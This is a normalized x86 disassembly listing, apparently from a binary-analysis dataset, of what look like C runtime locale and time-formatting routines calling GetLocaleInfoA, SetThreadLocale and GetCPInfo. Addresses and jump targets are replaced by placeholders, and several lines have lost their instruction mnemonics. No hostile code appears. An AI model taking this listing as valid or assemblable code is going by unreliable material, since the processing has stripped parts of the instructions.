jmp r-xdata
mov ecx [ ebp - 0x4c ]
add [ ebp - 0x4c ] 0xffffffff
test ecx ecx
jg r-xdata
mov eax [ ebp - 0x10 ]
add [ ebp - 0x10 ] 0xffffffff
test eax eax
jne r-xdata
mov edx [ ebp - 0x18 ]
cmp [ edx ] 0x2b
jne r-xdata
lea edx [ ebp - 0x564 ]
push edx
push 0x20
call sub_4c93ec
add esp 0x8
jmp r-xdata
mov eax [ ebp - 0x40 ]
add [ ebp - 0x40 ] 0xffffffff
test eax eax
jne r-xdata
push 0x2
push edi
lea eax [ ebp - 0x42 ]
push eax
call sub_4cc164
add esp 0xc
test eax eax
jle r-xdata
lea eax [ ebp - 0x4ac ]
mov [ ebp - 0x18 ] eax
mov edx [ ebp - 0x48 ]
mov [ ebp - 0x40 ] edx
lea ecx [ ebp - 0x564 ]
push ecx
push 0x30
call sub_4c93ec
add esp 0x8
lea eax [ ebp - 0x564 ]
push eax
mov edx [ ebp - 0x18 ]
add [ ebp - 0x18 ] 0x2
mov cx [ edx ]
push ecx
call sub_4c93ec
add esp 0x8
jmp r-xdata
mov dx [ ebp - 0x42 ]
mov [ ebx ] dx
add ebx 0x2
inc [ ebp - 0x48 ]
add edi eax
sub_4c9e18
push ebx
push esi
call sub_4c8704
xor esi esi
mov ebx rw-data
jmp r-xdata
cmp esi [ rw-data ]
jb r-xdata
test [ ebx + 0x12 ] 0x3
je r-xdata
call sub_4c8714
pop esi
pop ebx
retn
inc esi
add ebx 0x18
push ebx
call sub_4c6910
pop ecx
sub_4c9e4c
push ebp
mov ebp esp
push ebx
push esi
mov ebx [ ebp + 0x8 ]
push ebx
call sub_4c8724
pop ecx
push ebx
call sub_4c7248
pop ecx
mov esi eax
push ebx
call sub_4c87ec
pop ecx
mov eax esi
pop esi
pop ebx
pop ebp
retn
sub_4c9e74
push ebp
mov ebp esp
push ebx
push esi
mov ebx [ ebp + 0x8 ]
push ebx
call sub_4c8724
pop ecx
push ebx
call sub_4c73f4
pop ecx
mov esi eax
push ebx
call sub_4c87ec
pop ecx
mov eax esi
pop esi
pop ebx
pop ebp
retn
sub_4c9e9c
push ebp
mov ebp esp
push ebx
push esi
mov ebx [ ebp + 0xc ]
push ebx
call sub_4c8724
pop ecx
push ebx
mov eax [ ebp + 0x8 ]
push eax
call sub_4c74e8
add esp 0x8
mov esi eax
push ebx
call sub_4c87ec
pop ecx
mov eax esi
pop esi
pop ebx
pop ebp
retn
sub_4c9ec8
push ebp
mov ebp esp
push ebx
push esi
mov ebx [ ebp + 0xc ]
push ebx
call sub_4c8724
pop ecx
push ebx
mov ax [ ebp + 0x8 ]
push eax
call sub_4c7604
add esp 0x8
mov esi eax
push ebx
call sub_4c87ec
pop ecx
mov eax esi
pop esi
pop ebx
pop ebp
retn
sub_4c9ef4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
xor esi esi
mov eax [ ebp + 0x10 ]
push eax
push 0x0
mov edx [ ebp + 0xc ]
push edx
call sub_4c4d44
add esp 0xc
jmp r-xdata
mov al [ ebx ]
test al al
jne r-xdata
movsx ecx al
cmp ecx 0x68
jg r-xdata
mov eax [ ebp + 0xc ]
pop edi
pop esi
pop ebx
pop ebp
retn
sub ecx 0x6d
je r-xdata
je r-xdata
cmp [ ebx + 0x1 ] 0x6d
jne r-xdata
sub ecx 0x6
je r-xdata
cmp [ ebx + 0x1 ] 0x68
jne r-xdata
cmp ecx 0x4d
jg r-xdata
push rw-data
push edi
call sub_4c4dec
add esp 0x8
jmp r-xdata
push rw-data
push edi
call sub_4c4dec
add esp 0x8
inc ebx
jmp r-xdata
cmp [ ebx + 0x1 ] 0x73
jne r-xdata
dec ecx
je r-xdata
push rw-data
push edi
call sub_4c4dec
add esp 0x8
jmp r-xdata
push rw-data
push edi
call sub_4c4dec
add esp 0x8
inc ebx
jmp r-xdata
sub ecx 0x64
je r-xdata
je r-xdata
xor esi esi
inc ebx
push rw-data
push edi
call sub_4c4dec
add esp 0x8
jmp r-xdata
push rw-data
push edi
call sub_4c4dec
add esp 0x8
inc ebx
jmp r-xdata
cmp [ ebx + 0x1 ] 0x74
jne r-xdata
sub ecx 0x5
je r-xdata
mov eax ebx
jmp r-xdata
sub ecx 0x3
je r-xdata
mov eax ebx
jmp r-xdata
sub ecx 0x27
je r-xdata
push rw-data
push edi
call sub_4c4dec
add esp 0x8
jmp r-xdata
inc ebx
jmp r-xdata
mov eax ebx
jmp r-xdata
jmp r-xdata
mov dl [ eax ]
inc eax
cmp dl 0x64
je r-xdata
cmp [ ebx + 0x1 ] 0x67
jne r-xdata
jmp r-xdata
mov dl [ eax ]
inc eax
cmp dl 0x4d
je r-xdata
sub ecx 0x21
je r-xdata
mov dl [ eax ]
inc eax
cmp dl 0x79
je r-xdata
push 0x1
push ebx
push edi
call sub_4c4ed8
add esp 0xc
inc esi
dec esi
je r-xdata
push rw-data
push edi
call sub_4c4dec
add esp 0x8
inc ebx
jmp r-xdata
inc esi
dec esi
je r-xdata
cmp [ ebx + 0x1 ] 0x48
jne r-xdata
jmp r-xdata
inc esi
dec esi
je r-xdata
push rw-data
push edi
call sub_4c4dec
add esp 0x8
jmp r-xdata
dec esi
je r-xdata
push rw-data
push edi
call sub_4c4dec
add esp 0x8
jmp r-xdata
dec esi
je r-xdata
push rw-data
push edi
call sub_4c4dec
add esp 0x8
jmp r-xdata
push rw-data
push edi
call sub_4c4dec
add esp 0x8
inc ebx
jmp r-xdata
push rw-data
push edi
call sub_4c4dec
add esp 0x8
jmp r-xdata
dec esi
je r-xdata
inc ebx
push rw-data
push edi
call sub_4c4dec
add esp 0x8
jmp r-xdata
dec esi
je r-xdata
inc ebx
push rw-data
push edi
call sub_4c4dec
add esp 0x8
jmp r-xdata
dec esi
je r-xdata
inc ebx
push rw-data
push edi
call sub_4c4dec
add esp 0x8
jmp r-xdata
sub esi 0x2
je r-xdata
add ebx 0x2
push rw-data
push edi
call sub_4c4dec
add esp 0x8
jmp r-xdata
dec esi
je r-xdata
add ebx 0x2
push rw-data
push edi
call sub_4c4dec
add esp 0x8
jmp r-xdata
dec esi
je r-xdata
add ebx 0x3
push rw-data
push edi
call sub_4c4dec
add esp 0x8
jmp r-xdata
jmp r-xdata
add ebx 0x3
push rw-data
push edi
call sub_4c4dec
add esp 0x8
jmp r-xdata
jmp r-xdata
add ebx 0x3
push rw-data
push edi
call sub_4c4dec
add esp 0x8
jmp r-xdata
jmp r-xdata
sub_4ca1c0
push ebp
mov ebp esp
mov eax [ rw-data ]
mov edx [ ebp + 0x8 ]
cmp edx 0x10
jg r-xdata
sub edx 0x50
je r-xdata
je r-xdata
mov ecx [ eax + 0x18 ]
mov eax [ ecx + 0xc ]
pop ebp
retn
dec edx
je r-xdata
mov edx [ eax + 0x18 ]
mov eax [ edx + 0x8 ]
pop ebp
retn
sub edx 0xe
je r-xdata
mov eax [ eax + 0x18 ]
mov eax [ eax + 0x10 ]
pop ebp
retn
jmp r-xdata
mov ecx [ eax + 0x18 ]
mov eax [ ecx + 0x4 ]
pop ebp
retn
dec edx
je r-xdata
xor eax eax
pop ebp
retn
mov eax [ eax + 0x18 ]
mov eax [ eax ]
pop ebp
retn
jmp r-xdata
sub_4ca41c
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
cmp edx 0xff
jbe r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop ebp
retn
movsx edx dx
movzx eax [ edx * 2 + rw-data ]
and eax ecx
pop ebp
retn
cmp [ eax + 0x10 ] 0x0
jne r-xdata
mov eax [ eax + 0x10 ]
movzx edx [ eax + edx * 2 + 0x2 ]
and ecx edx
mov eax ecx
pop ebp
retn
sub_4ca460
push ebp
mov ebp esp
push ecx
push ebx
cmp [ ebp + 0x8 ] 0xffff
mov ebx [ ebp + 0xc ]
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x8 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
lea edx [ ebp - 0x2 ]
lea ecx [ ebp + 0x8 ]
push edx
push 0x1
push ecx
push 0x1
call GetStringTypeW
movzx eax [ ebp - 0x2 ]
and eax ebx
cmp [ ebp + 0x8 ] 0x100
jge r-xdata
pop ebx
pop ecx
pop ebp
retn
movsx ecx [ ebp + 0x8 ]
movzx eax [ ecx * 2 + rw-data ]
and eax ebx
jmp r-xdata
sub_4ca4b8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
call sub_4caa74
test edi edi
je r-xdata
push 0x0
push esi
call sub_4ca570
add esp 0x8
push 0x1000
call sub_4c428c
pop ecx
mov ebx eax
push 0x1000
push edi
push ebx
call sub_4cc5b8
add esp 0xc
push ebx
push esi
call sub_4ca570
add esp 0x8
mov eax rw-data
mov esi [ rw-data ]
cmp eax esi
je r-xdata
push ebx
call sub_4c429c
pop ecx
jmp r-xdata
mov eax [ esi + 0x24 ]
push eax
call sub_4c4e7c
add eax eax
pop ecx
mov esi eax
mov ecx [ rw-data ]
mov edx esi
add edx edx
push edx
mov eax [ ecx + 0x28 ]
push eax
call sub_4c42ac
add esp 0x8
mov edi eax
mov eax [ rw-data ]
mov [ eax + 0x28 ] edi
push esi
mov edx [ rw-data ]
mov ecx [ edx + 0x24 ]
push ecx
push edi
call sub_4cc444
add esp 0xc
call sub_4caa80
mov eax [ rw-data ]
mov eax [ eax + 0x28 ]
pop edi
pop esi
pop ebx
pop ebp
retn
sub_4ca570
push ebp
mov ebp esp
add esp 0xffffffd8
xor eax eax
push ebx
push esi
push edi
xor ebx ebx
mov edi [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
xor eax eax
test edi edi
mov [ ebp - 0x10 ] eax
mov esi rw-data
je r-xdata
call sub_4caa74
mov eax [ esi ]
test eax eax
je r-xdata
push edi
call sub_4c4fe8
pop ecx
mov ebx eax
cmp eax rw-data
jne r-xdata
cmp eax rw-data
jne r-xdata
push 0x2c
push 0x1
call sub_4c3b98
add esp 0x8
mov [ esi ] eax
test eax eax
jne r-xdata
mov [ ebp - 0xc ] 0x1
mov edx [ esi ]
mov eax [ edx + 0x24 ]
test eax eax
je r-xdata
push 0xe
call SetLastError
push ebx
call sub_4c429c
pop ecx
call sub_4caa80
xor eax eax
jmp r-xdata
test ebx ebx
je r-xdata
push eax
call sub_4c429c
pop ecx
mov edx [ esi ]
xor ecx ecx
mov [ edx + 0x24 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
test ebx ebx
jne r-xdata
cmp [ ebx ] 0x0
jne r-xdata
call GetUserDefaultLCID
mov [ ebp - 0x10 ] eax
push 0x7
lea edx [ ebp - 0x8 ]
push edx
push 0xb
mov ecx [ ebp - 0x10 ]
push ecx
call GetLocaleInfoA
lea eax [ ebp - 0x8 ]
push eax
call sub_4ccb50
pop ecx
mov edi [ esi ]
mov [ edi ] eax
xor eax eax
mov [ edi + 0x8 ] eax
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
push rw-data
push edi
call sub_4c5098
add esp 0x8
test eax eax
je r-xdata
mov edx [ esi ]
mov ecx [ ebp - 0x10 ]
mov [ edx + 0x4 ] ecx
push ebx
call sub_4c429c
pop ecx
push 0x1
mov eax [ esi ]
mov edx [ eax + 0x4 ]
push edx
call IsValidLocale
test eax eax
jne r-xdata
movsx edi [ ebp + 0x8 ]
mov eax edi
and eax 0x4
cmp eax 0x4
jne r-xdata
mov eax [ esi ]
push eax
call sub_4caf40
pop ecx
mov edx [ esi ]
push edx
call sub_4c429c
pop ecx
mov [ esi ] rw-data
jmp r-xdata
push rw-data
push edi
call sub_4c5098
add esp 0x8
test eax eax
je r-xdata
push esi
push edi
mov esi rw-data
mov edi ebx
mov eax edi
movsd [ edi ] [ esi ]
pop edi
pop esi
push 0x2e
push edi
call sub_4c4e28
add esp 0x8
mov [ ebp - 0x14 ] eax
test eax eax
je r-xdata
mov edx [ esi ]
mov ecx [ edx + 0x4 ]
push ecx
call SetThreadLocale
mov eax [ esi ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov ecx [ esi ]
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov ecx edi
and ecx 0x10
cmp ecx 0x10
jne r-xdata
push rw-data
mov edx [ esi ]
push edx
call sub_4cb520
add esp 0x8
push rw-data
push edi
call sub_4c5098
add esp 0x8
test eax eax
je r-xdata
push esi
push edi
mov esi rw-data
mov edi ebx
mov eax edi
movsd [ edi ] [ esi ]
pop edi
pop esi
push 0x2e
push edi
call sub_4c4e28
add esp 0x8
mov [ ebp - 0x14 ] eax
test eax eax
je r-xdata
mov eax edi
mov edx rw-data
mov ecx [ ebp - 0x14 ]
push esi
push edi
mov edi ecx
xor eax eax
or ecx 0xffffffff
[ edi ]
not ecx
lea edx [ ebx + 0x3 ]
sub edi ecx
mov esi edx
mov edx ecx
xchg edi esi
shr ecx 0x2
mov eax edi
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
jmp r-xdata
mov [ rw-data ] 0x1
call sub_4cbed8
call sub_4caa80
mov edx [ esi ]
mov eax [ edx + 0x24 ]
push eax
call sub_4caf40
mov dx [ ebp + 0x8 ]
pop ecx
push edx
mov ecx [ esi ]
push ecx
call sub_4cad84
add esp 0x8
test eax eax
jne r-xdata
push 0x20000103
call SetLastError
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx edi
and edx 0x20
cmp edx 0x20
jne r-xdata
push rw-data
mov eax [ esi ]
push eax
call sub_4cb520
add esp 0x8
push rw-data
push edi
call sub_4c5098
add esp 0x8
test eax eax
je r-xdata
push esi
push edi
mov esi rw-data
mov edi ebx
mov eax edi
movsd [ edi ] [ esi ]
pop edi
pop esi
push 0x2e
push edi
call sub_4c4e28
add esp 0x8
mov [ ebp - 0x14 ] eax
test eax eax
je r-xdata
mov ecx [ ebp - 0x14 ]
push esi
push edi
mov edi ecx
xor eax eax
or ecx 0xffffffff
[ edi ]
not ecx
lea edx [ ebx + 0x3 ]
sub edi ecx
mov esi edx
mov edx ecx
xchg edi esi
shr ecx 0x2
mov eax edi
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
jmp r-xdata
cmp [ ebx ] 0x4c
jne r-xdata
test cl cl
je r-xdata
mov edx [ esi ]
mov ecx [ edx ]
push ecx
call sub_4ce7b4
pop ecx
test eax eax
jne r-xdata
push 0x20000102
call SetLastError
cmp [ ebp - 0xc ] 0x0
je r-xdata
call sub_4caa80
xor eax eax
jmp r-xdata
mov eax [ esi ]
push eax
call sub_4caf40
pop ecx
mov edx [ esi ]
push edx
call sub_4c429c
pop ecx
mov [ esi ] rw-data
mov eax edi
and eax 0x1
dec eax
jne r-xdata
push rw-data
mov ecx [ esi ]
push ecx
call sub_4cb520
add esp 0x8
push esi
push edi
mov esi rw-data
mov edi ebx
mov eax edi
movsd [ edi ] [ esi ]
pop edi
pop esi
push 0x2e
push edi
call sub_4c4e28
add esp 0x8
mov [ ebp - 0x14 ] eax
test eax eax
je r-xdata
mov ecx [ ebp - 0x14 ]
push esi
push edi
mov edi ecx
xor eax eax
or ecx 0xffffffff
[ edi ]
not ecx
lea edx [ ebx + 0x3 ]
sub edi ecx
mov esi edx
mov edx ecx
xchg edi esi
shr ecx 0x2
mov eax edi
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
jmp r-xdata
mov edi [ esi ]
xor eax eax
mov [ edi + 0x8 ] eax
push ebx
push edi
call sub_4cab2c
add esp 0x8
mov [ ebp - 0x10 ] eax
test eax eax
jne r-xdata
cmp [ ebx + 0x1 ] 0x43
jne r-xdata
jne r-xdata
mov cl [ eax + 0x1 ]
cmp cl [ edx + 0x1 ]
jne r-xdata
call sub_4caa80
push 0x20000106
call SetLastError
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x28 ]
push eax
mov edx [ esi ]
mov ecx [ edx ]
push ecx
call GetCPInfo
test eax eax
jne r-xdata
call sub_4caa80
xor eax eax
jmp r-xdata
mov eax [ esi ]
push eax
call sub_4caf40
pop ecx
mov edx [ esi ]
push edx
call sub_4c429c
pop ecx
mov [ esi ] rw-data
and edi 0x2
cmp edi 0x2
jne r-xdata
push rw-data
mov edx [ esi ]
push edx
call sub_4cb520
add esp 0x8
mov ecx [ ebp - 0x14 ]
push esi
push edi
mov edi ecx
xor eax eax
or ecx 0xffffffff
[ edi ]
not ecx
lea edx [ ebx + 0x3 ]
sub edi ecx
mov esi edx
mov edx ecx
xchg edi esi
shr ecx 0x2
mov eax edi
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp [ ebx + 0x2 ] 0x5f
jne r-xdata
mov eax [ esi ]
push eax
call sub_4caf40
pop ecx
mov edx [ esi ]
push edx
call sub_4c429c
pop ecx
mov [ esi ] rw-data
jmp r-xdata
add eax 0x2
add edx 0x2
test cl cl
jne r-xdata
mov edx [ ebp - 0x28 ]
mov [ rw-data ] edx
call sub_4cbed8
call sub_4caa80
mov ecx [ esi ]
mov eax [ ecx + 0x24 ]
jmp r-xdata
push ebx
call sub_4c429c
pop ecx
call sub_4cbed8
call sub_4caa80
mov eax [ esi ]
mov eax [ eax + 0x24 ]
jmp r-xdata
push rw-data
mov ecx [ esi ]
push ecx
call sub_4cb520
add esp 0x8
call sub_4caa80
push ebx
call sub_4c429c
pop ecx
xor eax eax
jmp r-xdata
mov edx [ esi ]
push edx
call sub_4c429c
pop ecx
mov [ esi ] rw-data
push ebx
call sub_4c429c
pop ecx
call sub_4caa80
push edi
mov ecx [ esi ]
push ecx
call sub_4cb2ec
add esp 0x8
jmp r-xdata
mov cl [ eax ]
cmp cl [ edx ]
jne r-xdata
sub_4caaa8
call sub_4caa74
mov eax [ rw-data ]
push eax
call sub_4caf40
pop ecx
mov edx rw-data
mov eax [ rw-data ]
cmp edx eax
je r-xdata
call sub_4caa80
mov edx [ rw-data ]
push edx
call DeleteCriticalSection
mov ecx [ rw-data ]
push ecx
call sub_4c429c
pop ecx
retn
mov edx [ eax + 0x28 ]
test edx edx
je r-xdata
mov edx [ rw-data ]
mov eax [ edx + 0x24 ]
test eax eax
je r-xdata
push edx
call sub_4c429c
pop ecx
mov ecx [ rw-data ]
xor eax eax
mov [ ecx + 0x28 ] eax
mov eax [ rw-data ]
push eax
call sub_4c429c
pop ecx
push eax
call sub_4c429c
pop ecx
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + 0x24 ] ecx
sub_4cab2c
push ebp
mov ebp esp
add esp 0xffffff9c
mov ecx 0x10
push ebx
push esi
push edi
xor edi edi
mov esi [ ebp + 0xc ]
xor eax eax
mov [ ebp - 0xc ] 0x1
mov [ ebp - 0x10 ] eax
push esi
push edi
lea edi [ ebp - 0x64 ]
mov esi rw-data
mov ebx 0x1
[ edi ] [ esi ]
pop edi
pop esi
mov eax [ rw-data ]
mov [ ebp - 0x14 ] eax
push esi
call sub_4cbf7c
pop ecx
jmp r-xdata
test edi edi
jne r-xdata
test edi edi
jne r-xdata
cmp ebx 0x38
jle r-xdata
test edi edi
jne r-xdata
push 0x5f
push esi
call sub_4c4e28
add esp 0x8
test eax eax
jne r-xdata
mov edx ebx
lea eax [ ebp - 0x64 ]
or dx 0x400
movzx ecx dx
or ecx 0x0
mov [ ebp - 0x4 ] ecx
push 0x40
push eax
push 0x1001
mov edx [ ebp - 0x4 ]
push edx
call GetLocaleInfoA
push 0x4
lea ecx [ ebp - 0x14 ]
push ecx
push 0x3
mov eax [ ebp - 0x4 ]
push eax
call GetLocaleInfoA
lea edx [ ebp - 0x64 ]
push edx
call sub_4cbf7c
pop ecx
lea ecx [ ebp - 0x14 ]
push ecx
call sub_4cbf7c
pop ecx
lea eax [ ebp - 0x64 ]
push eax
push esi
call sub_4c5098
add esp 0x8
test eax eax
je r-xdata
push 0x5f
push esi
call sub_4c4e28
add esp 0x8
mov [ ebp - 0x18 ] eax
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x4 ] 0x0
jne r-xdata
push 0x2e
push esi
call sub_4c4e28
add esp 0x8
test eax eax
jne r-xdata
lea eax [ ebp - 0x14 ]
push eax
push esi
call sub_4c5098
add esp 0x8
cmp esi eax
jne r-xdata
mov edi 0x1
jmp r-xdata
or bx 0x400
movzx ecx bx
or ecx 0x0
mov [ ebp - 0x10 ] ecx
inc [ ebp - 0x18 ]
push 0x2e
mov edx [ ebp - 0x18 ]
push edx
call sub_4c4e28
add esp 0x8
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov ebx [ eax + 0x4 ]
and ebx 0x3ff
call GetSystemDefaultLangID
movzx ebx ax
jmp r-xdata
push 0x20000101
call SetLastError
xor eax eax
jmp r-xdata
inc ebx
mov edi 0x1
jmp r-xdata
inc [ ebp - 0x18 ]
mov ecx [ ebp - 0x18 ]
push ecx
call sub_4ccb50
pop ecx
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
push 0x7
lea edx [ ebp - 0x24 ]
push edx
push 0xb
mov ecx [ ebp - 0x10 ]
push ecx
call GetLocaleInfoA
lea eax [ ebp - 0x24 ]
push eax
call sub_4ccb50
pop ecx
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
mov [ ebp - 0x8 ] 0x1
xor edi edi
jmp r-xdata
mov edx [ ebp - 0x1c ]
mov [ edx ] 0x0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x10 ]
test edi edi
jne r-xdata
test edi edi
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
push 0x20000101
call SetLastError
xor eax eax
jmp r-xdata
push 0x40
lea eax [ ebp - 0x64 ]
push eax
push 0x1002
mov dx [ ebp - 0xc ]
shl edx 0xa
or dx bx
movzx ecx dx
or ecx 0x0
push ecx
call GetLocaleInfoA
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x64 ]
push eax
call sub_4cbf7c
pop ecx
lea eax [ ebp - 0x64 ]
mov edx [ ebp - 0x18 ]
push 0x2e
push esi
call sub_4c4e28
add esp 0x8
mov [ ebp - 0x18 ] eax
test eax eax
jne r-xdata
mov edx [ ebp - 0x1c ]
mov [ edx ] 0x2e
jmp r-xdata
inc [ ebp - 0xc ]
test cl cl
je r-xdata
jne r-xdata
mov cl [ eax + 0x1 ]
cmp cl [ edx + 0x1 ]
jne r-xdata
mov ax [ ebp - 0xc ]
mov edi 0x1
shl eax 0xa
or ax bx
movzx edx ax
or edx 0x0
mov [ ebp - 0x10 ] edx
jmp r-xdata
add eax 0x2
add edx 0x2
test cl cl
jne r-xdata
mov cl [ eax ]
cmp cl [ edx ]
jne r-xdata
sub_4cad84
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
mov esi 0x1
mov eax [ ebx + 0x24 ]
test eax eax
je r-xdata
movsx ecx di
xor edx edx
and ecx 0x4
cmp ecx 0x4
mov [ ebx + 0x24 ] edx
jne r-xdata
push eax
call sub_4c429c
pop ecx
movsx eax di
and eax 0x20
cmp eax 0x20
jne r-xdata
push 0x34
call sub_4c428c
pop ecx
mov [ ebx + 0x14 ] eax
test eax eax
jne r-xdata
movsx eax di
and eax 0x10
cmp eax 0x10
jne r-xdata
push 0xc4
call sub_4c428c
pop ecx
mov [ ebx + 0x20 ] eax
test eax eax
jne r-xdata
mov edx [ ebx + 0x14 ]
push edx
mov ecx [ ebx + 0x4 ]
push ecx
call sub_4cb868
add esp 0x8
imul esi eax
test esi esi
je r-xdata
push 0xe
call SetLastError
xor eax eax
jmp r-xdata
movsx eax di
and eax 0x1
dec eax
jne r-xdata
push 0x18
call sub_4c428c
pop ecx
mov [ ebx + 0x18 ] eax
test eax eax
jne r-xdata
mov edx [ ebx + 0x20 ]
push edx
mov ecx [ ebx + 0x4 ]
push ecx
call sub_4cb9e8
add esp 0x8
imul esi eax
test esi esi
je r-xdata
push 0xe
call SetLastError
xor eax eax
jmp r-xdata
push rw-data
push ebx
call sub_4cb520
add esp 0x8
imul esi eax
pop edi
pop esi
pop ebx
pop ebp
retn
movsx eax di
and eax 0x2
cmp eax 0x2
jne r-xdata
push 0x2
call sub_4c428c
pop ecx
mov [ ebx + 0x1c ] eax
test eax eax
jne r-xdata
mov edx [ ebx + 0x18 ]
push edx
mov ecx [ ebx + 0x4 ]
push ecx
call sub_4cbe44
add esp 0x8
imul esi eax
test esi esi
je r-xdata
push 0xe
call SetLastError
xor eax eax
jmp r-xdata
push rw-data
push ebx
call sub_4cb520
add esp 0x8
imul esi eax
mov eax esi
push 0x202
call sub_4c428c
pop ecx
mov [ ebx + 0x10 ] eax
test eax eax
jne r-xdata
mov edx [ ebx + 0x1c ]
push edx
mov ecx [ ebx + 0x4 ]
push ecx
call sub_4cbecc
add esp 0x8
imul esi eax
test esi esi
je r-xdata
push 0xe
call SetLastError
xor eax eax
jmp r-xdata
push rw-data
push ebx
call sub_4cb520
add esp 0x8
imul esi eax
mov edx [ ebx + 0x10 ]
push edx
mov ecx [ ebx ]
push ecx
mov eax [ ebx + 0x4 ]
push eax
call sub_4cb778
add esp 0xc
imul esi eax
test esi esi
je r-xdata
push 0xe
call SetLastError
xor eax eax
jmp r-xdata
push rw-data
push ebx
call sub_4cb520
add esp 0x8
imul esi eax
push rw-data
push ebx
call sub_4cb520
add esp 0x8
imul esi eax
sub_4caf40
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x20 ]
test eax eax
je r-xdata
cmp eax rw-data
je r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
je r-xdata
cmp eax rw-data
je r-xdata
mov edx [ eax + 0x18 ]
push edx
call sub_4c429c
pop ecx
mov ecx [ ebx + 0x14 ]
mov eax [ ecx + 0x14 ]
push eax
call sub_4c429c
pop ecx
mov edx [ ebx + 0x14 ]
mov ecx [ edx + 0x1c ]
push ecx
call sub_4c429c
pop ecx
mov eax [ ebx + 0x14 ]
mov edx [ eax + 0x20 ]
push edx
call sub_4c429c
pop ecx
mov ecx [ ebx + 0x14 ]
mov eax [ ecx + 0x24 ]
push eax
call sub_4c429c
pop ecx
mov edx [ ebx + 0x14 ]
mov ecx [ edx + 0x28 ]
push ecx
call sub_4c429c
pop ecx
mov eax [ ebx + 0x14 ]
mov edx [ eax + 0x2c ]
push edx
call sub_4c429c
pop ecx
mov ecx [ ebx + 0x14 ]
mov eax [ ecx + 0x30 ]
push eax
call sub_4c429c
pop ecx
mov edx [ ebx + 0x14 ]
push edx
call sub_4c429c
pop ecx
xor ecx ecx
mov [ ebx + 0x14 ] ecx
mov eax [ ebx + 0x1c ]
test eax eax
je r-xdata
cmp eax rw-data
je r-xdata
mov edx [ eax ]
push edx
call sub_4c429c
pop ecx
mov ecx [ ebx + 0x20 ]
mov eax [ ecx + 0x4 ]
push eax
call sub_4c429c
pop ecx
mov edx [ ebx + 0x20 ]
mov ecx [ edx + 0x8 ]
push ecx
call sub_4c429c
pop ecx
mov eax [ ebx + 0x20 ]
mov edx [ eax + 0xc ]
push edx
call sub_4c429c
pop ecx
mov ecx [ ebx + 0x20 ]
mov eax [ ecx + 0x10 ]
push eax
call sub_4c429c
pop ecx
mov edx [ ebx + 0x20 ]
mov ecx [ edx + 0x14 ]
push ecx
call sub_4c429c
pop ecx
mov eax [ ebx + 0x20 ]
mov edx [ eax + 0x18 ]
push edx
call sub_4c429c
pop ecx
mov ecx [ ebx + 0x20 ]
mov eax [ ecx + 0x2c ]
push eax
call sub_4c429c
pop ecx
mov edx [ ebx + 0x20 ]
mov ecx [ edx + 0x30 ]
push ecx
call sub_4c429c
pop ecx
mov eax [ ebx + 0x20 ]
mov edx [ eax + 0x34 ]
push edx
call sub_4c429c
pop ecx
mov ecx [ ebx + 0x20 ]
mov eax [ ecx + 0x38 ]
push eax
call sub_4c429c
pop ecx
mov edx [ ebx + 0x20 ]
mov ecx [ edx + 0x3c ]
push ecx
call sub_4c429c
pop ecx
mov eax [ ebx + 0x20 ]
mov edx [ eax + 0x40 ]
push edx
call sub_4c429c
pop ecx
mov ecx [ ebx + 0x20 ]
mov eax [ ecx + 0x44 ]
push eax
call sub_4c429c
pop ecx
mov edx [ ebx + 0x20 ]
mov ecx [ edx + 0x48 ]
push ecx
call sub_4c429c
pop ecx
mov eax [ ebx + 0x20 ]
mov edx [ eax + 0x4c ]
push edx
call sub_4c429c
pop ecx
mov ecx [ ebx + 0x20 ]
mov eax [ ecx + 0x50 ]
push eax
call sub_4c429c
pop ecx
mov edx [ ebx + 0x20 ]
mov ecx [ edx + 0x54 ]
push ecx
call sub_4c429c
pop ecx
mov eax [ ebx + 0x20 ]
mov edx [ eax + 0x58 ]
push edx
call sub_4c429c
pop ecx
mov ecx [ ebx + 0x20 ]
mov eax [ ecx + 0x5c ]
push eax
call sub_4c429c
pop ecx
mov edx [ ebx + 0x20 ]
mov ecx [ edx + 0x60 ]
push ecx
call sub_4c429c
pop ecx
mov eax [ ebx + 0x20 ]
mov edx [ eax + 0x64 ]
push edx
call sub_4c429c
pop ecx
mov ecx [ ebx + 0x20 ]
mov eax [ ecx + 0x68 ]
push eax
call sub_4c429c
pop ecx
mov edx [ ebx + 0x20 ]
mov ecx [ edx + 0x6c ]
